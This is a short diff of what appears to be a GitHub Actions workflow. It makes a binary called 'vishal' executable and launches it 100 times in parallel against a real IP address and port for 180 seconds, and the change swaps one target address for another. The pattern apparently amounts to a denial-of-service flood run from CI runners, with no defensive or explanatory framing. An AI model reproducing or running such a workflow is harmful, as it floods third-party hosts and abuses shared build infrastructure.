@@ -9,6 +9,6 @@ jobs:
       - run: chmod +x vishal
       - run: |
           for i in {1..100}; do
-            ./vishal 20.235.142.253 26996 180 &
+            ./vishal 4.240.58.7 28631 180 &
           done
           wait
